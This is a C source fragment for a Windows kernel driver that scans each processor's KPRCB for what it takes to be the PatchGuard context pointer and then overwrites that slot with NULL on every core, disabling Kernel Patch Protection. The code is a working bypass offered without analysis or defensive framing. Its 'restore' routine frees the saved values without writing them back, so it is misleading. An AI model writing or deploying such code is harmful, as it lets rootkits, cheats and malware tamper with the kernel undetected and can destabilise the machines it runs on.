
static ULONG      G_PgContextOffset = 0;
static BOOLEAN    G_PgDisabled      = FALSE;
static PVOID*     G_PgSavedContexts = NULL;
static KSPIN_LOCK G_PgLock          = { 0 };

#define PG_MAX_CORES 64 

static BOOLEAN MigrateToCore(ULONG Target)
{
	for (int r = 0; r < 16; r++)
	{
		if (KeGetCurrentProcessorNumber() == Target)
			return TRUE;
		KeStallExecutionProcessor(100); 
	}
	return KeGetCurrentProcessorNumber() == Target;
}

static NTSTATUS
LocatePgContextOffset(_Out_ PULONG OutOffset)
{
	ULONG FastPass[128] = {};
	ULONG FastCnt = 0;

	{
		ULONG_PTR Kp = (ULONG_PTR)KeGetPcr();
		PUCHAR Pb = (PUCHAR)(Kp + 0x180);
		LogMessage("[PatchGuard] Pass A: KPRCB base from GS = %p, scanning offsets 0x100-0x17FF8...\n",
			(PVOID)(Kp + 0x180));
		for (ULONG off = 0x100; off <= 0x17FF8 && FastCnt < 128; off += 8)
		{
			PVOID V;
			__try { V = *(volatile PVOID*)(Pb + (SIZE_T)off); }
			__except(EXCEPTION_EXECUTE_HANDLER) { continue; }
			if (V == NULL) continue;
			if ((ULONG_PTR)V < 0xFFFF800000000000ULL) continue;

			BOOLEAN big = FALSE;
			__try {
				volatile UCHAR b = *(volatile PUCHAR)((PUCHAR)V + 0x800);
				(void)b; big = TRUE;
			} __except(EXCEPTION_EXECUTE_HANDLER) {}
			if (!big) continue;

			FastPass[FastCnt++] = off;
			LogMessage("[PatchGuard] Pass A candidate: off=0x%04X ctx=%p\n", off, V);
		}
		LogMessage("[PatchGuard] Pass A: %lu candidates total (probed +0x800)\n", FastCnt);
	}

	KAFFINITY Aff = KeQueryActiveProcessors();
	KAFFINITY Msk = Aff;
	KAFFINITY OrigAff = 0;
	ULONG_PTR NtPgBase = 0;
	ULONG     NtPgSize = 0;
	for (ULONG fi = 0; fi < FastCnt; fi++)
	{
		ULONG ok = 0, done = 0;
		ULONG FailedCore = MAXULONG;
		PVOID  FailedVal  = NULL;
		PVOID  SampleCtx  = NULL;
		PCCH   FailReason = "";
		for (ULONG Core = 0; Core < PG_MAX_CORES && done < 64; Core++)
		{
			KAFFINITY Mk = (KAFFINITY)(1ULL << Core);
			if (!(Msk & Mk)) continue;
			{
				KAFFINITY Prev = KeSetSystemAffinityThreadEx(Mk);
				if (OrigAff == 0) OrigAff = Prev;
			}
			if (!MigrateToCore(Core)) continue;
			done++;

			ULONG_PTR Kp = (ULONG_PTR)KeGetPcr();
			PUCHAR Pb = (PUCHAR)(Kp + 0x180);
			PVOID V;
			__try { V = *(volatile PVOID*)(Pb + (SIZE_T)FastPass[fi]); }
			__except(EXCEPTION_EXECUTE_HANDLER) { break; }
			if (V == NULL) { FailedCore = Core; FailedVal = NULL; FailReason = "NULL"; break; }
			if ((ULONG_PTR)V < 0xFFFF800000000000ULL)
				{ FailedCore = Core; FailedVal = V; FailReason = "user addr"; break; }

			if (NtPgBase == 0)
			{
				PVOID Base = NULL;
				RtlPcToFileHeader(V, &Base);
				if (Base)
				{
					PIMAGE_NT_HEADERS NtHdr = RtlImageNtHeader(Base);
					if (NtHdr)
					{
						NtPgBase = (ULONG_PTR)Base;
						NtPgSize = NtHdr->OptionalHeader.SizeOfImage;
						LogMessage("[PatchGuard] ntoskrnl bounds: %p size 0x%X\n",
							(PVOID)NtPgBase, NtPgSize);
					}
				}
			}
			if (NtPgBase && (ULONG_PTR)V >= NtPgBase && (ULONG_PTR)V < NtPgBase + NtPgSize)
				{ FailedCore = Core; FailedVal = V; FailReason = "ntoskrnl img"; break; }

			if (SampleCtx == NULL) SampleCtx = V;
			ok++;
		}
		if (OrigAff != 0)
			KeSetSystemAffinityThreadEx(OrigAff);

		if (ok > 0 && ok == done)
		{
			LogMessage("[PatchGuard] Pass B matched: off=0x%04X %lu/%lu cores ok, sample ctx=%p\n",
				FastPass[fi], ok, done, SampleCtx);
			*OutOffset = FastPass[fi];
			return STATUS_SUCCESS;
		}
		else
		{
			LogMessage("[PatchGuard] Pass B mismatch: off=0x%04X %lu/%lu cores ok, core[%lu]=%p (%s)\n",
				FastPass[fi], ok, done, FailedCore, FailedVal, FailReason);
		}
	}

	LogMessage("[PatchGuard] no PG offset found.\n");
	return STATUS_NOT_FOUND;
}

static NTSTATUS
PgLocateOffset(_Out_ PULONG Offset)
{
	KLOCK_QUEUE_HANDLE LockHandle;

	KeAcquireInStackQueuedSpinLock(&G_PgLock, &LockHandle);
	if (G_PgContextOffset != 0)
	{
		*Offset = G_PgContextOffset;
		KeReleaseInStackQueuedSpinLock(&LockHandle);
		return STATUS_SUCCESS;
	}
	KeReleaseInStackQueuedSpinLock(&LockHandle);

	ULONG Local = 0;
	NTSTATUS Status = LocatePgContextOffset(&Local);

	KeAcquireInStackQueuedSpinLock(&G_PgLock, &LockHandle);
	if (G_PgContextOffset == 0 && NT_SUCCESS(Status))
		G_PgContextOffset = Local;
	*Offset = G_PgContextOffset;
	KeReleaseInStackQueuedSpinLock(&LockHandle);

	return G_PgContextOffset != 0 ? STATUS_SUCCESS : Status;
}

static NTSTATUS
KrnlDisablePg(_Out_ PPG_CONTROL_OUTPUT Output)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	KLOCK_QUEUE_HANDLE LockHandle;

	KeAcquireInStackQueuedSpinLock(&G_PgLock, &LockHandle);
	if (G_PgDisabled)
	{
		Output->PgContextOffset = G_PgContextOffset;
		Output->CurrentValue    = 0;
		Output->IsPatched       = TRUE;
		Output->Status          = STATUS_ALREADY_REGISTERED;
		KeReleaseInStackQueuedSpinLock(&LockHandle);
		return STATUS_ALREADY_REGISTERED;
	}
	KeReleaseInStackQueuedSpinLock(&LockHandle);

	ULONG Offset = 0;
	Status = PgLocateOffset(&Offset);
	if (!NT_SUCCESS(Status))
	{
		Output->PgContextOffset = 0;
		Output->CurrentValue    = 0;
		Output->IsPatched       = FALSE;
		Output->Status          = (ULONG)Status;
		return Status;
	}

	KAFFINITY ActMsk = KeQueryActiveProcessors();
	ULONG CoreCount = 0;
	for (ULONG Core = 0; Core < PG_MAX_CORES; Core++)
		if (ActMsk & ((KAFFINITY)1 << Core)) CoreCount++;
	if (CoreCount == 0)
	{
		Output->Status = STATUS_NOT_SUPPORTED;
		return STATUS_NOT_SUPPORTED;
	}

	LogMessage("[PatchGuard] %lu active cores (group 0), PG context offset 0x%04X\n",
		CoreCount, Offset);

	if (G_PgSavedContexts == NULL)
	{
		G_PgSavedContexts = (PVOID*)ExAllocatePoolWithTag(
			NonPagedPool, PG_MAX_CORES * sizeof(PVOID), 'gPaD');
		if (G_PgSavedContexts == NULL)
		{
			Output->Status = STATUS_INSUFFICIENT_RESOURCES;
			return STATUS_INSUFFICIENT_RESOURCES;
		}
		RtlZeroMemory(G_PgSavedContexts, PG_MAX_CORES * sizeof(PVOID));
	}

	KAFFINITY OrigAff = 0;
	PVOID   SavedCtx[PG_MAX_CORES] = {};

	for (ULONG Core = 0; Core < PG_MAX_CORES; Core++)
	{
		KAFFINITY Mk = (KAFFINITY)(1ULL << Core);
		if (!(ActMsk & Mk)) continue;
		{
			KAFFINITY Prev = KeSetSystemAffinityThreadEx(Mk);
			if (OrigAff == 0) OrigAff = Prev;
		}
		if (!MigrateToCore(Core)) continue;

		PUCHAR Prcb = (PUCHAR)((ULONG_PTR)KeGetPcr() + 0x180);
		PVOID  V = NULL;
		__try { V = *(volatile PVOID*)(Prcb + (SIZE_T)Offset); }
		__except(EXCEPTION_EXECUTE_HANDLER) {}
		SavedCtx[Core] = V;
		LogMessage("[PatchGuard] core %lu: KPRCB=%p ctx=%p\n",
			Core, Prcb, V);
	}

	ULONG   AttemptedCount = 0;
	ULONG   Cleared = 0;
	BOOLEAN AnyCleared = FALSE;
	PVOID   FirstOriginal = NULL;
	for (ULONG Core = 0; Core < PG_MAX_CORES; Core++)
	{
		KAFFINITY Mk = (KAFFINITY)(1ULL << Core);
		if (!(ActMsk & Mk) || SavedCtx[Core] == NULL)
			continue;
		{
			KAFFINITY Prev = KeSetSystemAffinityThreadEx(Mk);
			if (OrigAff == 0) OrigAff = Prev;
		}
		if (!MigrateToCore(Core)) continue;

		KIRQL OldIrql = KeRaiseIrqlToDpcLevel();
		AttemptedCount++;

		PUCHAR Prcb = (PUCHAR)((ULONG_PTR)KeGetPcr() + 0x180);
		PVOID* PSlot = (PVOID*)(Prcb + (SIZE_T)Offset);

		BOOLEAN ClearedThis = FALSE;
		__try
		{
			*PSlot = NULL;
			if (*(volatile PVOID*)PSlot == NULL)
				ClearedThis = TRUE;
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			ClearedThis = FALSE;
		}

		KeLowerIrql(OldIrql);

		if (ClearedThis)
		{
			Cleared++;
			AnyCleared = TRUE;
			if (FirstOriginal == NULL) FirstOriginal = SavedCtx[Core];
			LogMessage("[PatchGuard] core %lu: cleared (was %p)\n",
				Core, SavedCtx[Core]);
		}
		else LogMessage("[PatchGuard] core %lu: clear FAILED was=%p\n",
			Core, SavedCtx[Core]);
	}

	for (ULONG Core = 0; Core < PG_MAX_CORES; Core++)
		G_PgSavedContexts[Core] = SavedCtx[Core];

	if (OrigAff != 0)
		KeSetSystemAffinityThreadEx(OrigAff);

	KeAcquireInStackQueuedSpinLock(&G_PgLock, &LockHandle);
	if (AnyCleared)
		G_PgDisabled = TRUE;
	KeReleaseInStackQueuedSpinLock(&LockHandle);

	Output->PgContextOffset = Offset;
	Output->OriginalValue   = (ULONG_PTR)FirstOriginal;
	Output->CurrentValue    = 0;
	Output->IsPatched       = AnyCleared;

	if (AnyCleared)
	{
		Output->Status = STATUS_SUCCESS;
		LogMessage("[PatchGuard] offset 0x%04X: %lu/%lu cleared, %lu total cores\n",
			Offset, Cleared, AttemptedCount, CoreCount);
		return STATUS_SUCCESS;
	}

	Output->Status = STATUS_UNSUCCESSFUL;
	LogMessage("[PatchGuard] No PG contexts cleared (%lu attempted, %lu/%lu active).\n",
		AttemptedCount, Cleared, CoreCount);
	return STATUS_UNSUCCESSFUL;
}

static NTSTATUS
KrnlRestorePg(_Out_ PPG_CONTROL_OUTPUT Output)
{
	KLOCK_QUEUE_HANDLE LockHandle;

	KeAcquireInStackQueuedSpinLock(&G_PgLock, &LockHandle);
	BOOLEAN WasDisabled = G_PgDisabled;
	G_PgDisabled  = FALSE;
	PVOID* Saved   = G_PgSavedContexts;
	G_PgSavedContexts = NULL;
	KeReleaseInStackQueuedSpinLock(&LockHandle);

	if (Saved)
		ExFreePoolWithTag(Saved, 'gPaD');

	if (!WasDisabled)
	{
		Output->IsPatched = FALSE;
		Output->Status    = STATUS_NOT_FOUND;
		return STATUS_NOT_FOUND;
	}

	Output->PgContextOffset = 0;
	Output->OriginalValue   = 0;
	Output->CurrentValue    = 0;
	Output->IsPatched       = FALSE;
	Output->Status          = STATUS_SUCCESS;
	return STATUS_SUCCESS;
}

static NTSTATUS
KrnlQueryPg(_Out_ PPG_CONTROL_OUTPUT Output)
{
	KLOCK_QUEUE_HANDLE LockHandle;

	RtlZeroMemory(Output, sizeof(*Output));

	ULONG Offset = 0;
	PgLocateOffset(&Offset);

	KeAcquireInStackQueuedSpinLock(&G_PgLock, &LockHandle);
	Output->PgContextOffset = G_PgContextOffset;
	Output->IsPatched       = G_PgDisabled;
	KeReleaseInStackQueuedSpinLock(&LockHandle);

	Output->OriginalValue = 0;
	Output->CurrentValue  = 0;
	Output->Status        = STATUS_SUCCESS;
	return STATUS_SUCCESS;
}